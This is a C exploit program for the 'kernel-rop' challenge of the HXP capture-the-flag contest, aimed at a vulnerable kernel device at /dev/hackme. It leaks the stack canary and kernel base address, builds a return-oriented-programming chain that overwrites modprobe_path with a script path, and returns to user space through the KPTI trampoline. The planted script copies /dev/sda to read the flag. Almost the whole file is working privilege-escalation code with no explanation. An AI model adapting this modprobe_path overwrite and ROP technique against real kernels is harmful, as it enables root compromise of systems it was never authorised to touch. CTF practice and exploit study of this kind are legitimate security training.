/*************************************************************
 * HXPCTF kernel-rop exploit
 * By Ziqiang Gu
 ************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define DEV "/dev/hackme"

//Registers to save
unsigned long u_cs, u_rflags, u_sp, u_ss;

//Global variables to build the payload
unsigned long canary, baseaddr, kpti_trampoline, modprobe_path, gadget1, gadget2, gadget3;

void save_state ()
{
        __asm__(
                ".intel_syntax noprefix;"
                "mov u_cs, cs;"
                "mov u_ss, ss;"
                "mov u_sp, rsp;"
                "pushf;"
                "pop u_rflags;"
                ".att_syntax;"
        );

        printf("[OK] %s finished. u_cs:%lx, u_rflags:%lx, u_sp:%lx, u_ss:%lx\n", __FUNCTION__, u_cs, u_rflags, u_sp, u_ss);
}

void leak_info (int fd)
{
        unsigned long buf[40];
        ssize_t num = read (fd, buf, sizeof(buf));

        canary = buf[16];
        baseaddr = buf[38] - 0xa157;
        kpti_trampoline = baseaddr + 0x200f10 + 22;
        modprobe_path = baseaddr + 0x1061820;
        gadget1 = baseaddr + 0x4d11; //pop rax; ret;
        gadget2 = baseaddr + 0x3190; //pop rbx ; pop r12 ; pop rbp ; ret;
        gadget3 = baseaddr + 0x306d; //mov qword ptr [rbx], rax; pop rbx; pop rbp; ret;

        printf("[DEBUG] canary leaked is: %lx, baseaddr leaked is: %lx\n", canary, baseaddr);
}

void foo ()
{
#if 1
        system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
        system("chmod +x /tmp/x");

        system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
        system("chmod +x /tmp/dummy");
        system("/tmp/dummy");
        system("cat /tmp/flag");
#endif
        exit(0);
}

void attack (int fd)
{
        //Now we begin to construct the payload
        unsigned long payload[50] = {0};
        unsigned idx = 16;
        payload[16] = canary;
        payload[20] = gadget1;
        payload[21] = 0x782f706d742f; // /tmp/x
        payload[22] = gadget2;
        payload[23] = modprobe_path;
        payload[26] = gadget3;
        payload[29] = kpti_trampoline;
        payload[32] = (unsigned long)foo;
        payload[33] = u_cs;
        payload[34] = u_rflags;
        payload[35] = u_sp;
        payload[36] = u_ss;
        printf("[OK] payload built. Now attack\n");
        ssize_t num = write (fd, payload, sizeof(payload));
}

int main ()
{
        save_state ();

        int fd = open (DEV, O_RDWR);

        if (fd < 0)
        {
                printf("Failed to open device %s\n", DEV);
                return -1;
        }

        leak_info (fd);
        attack (fd);
}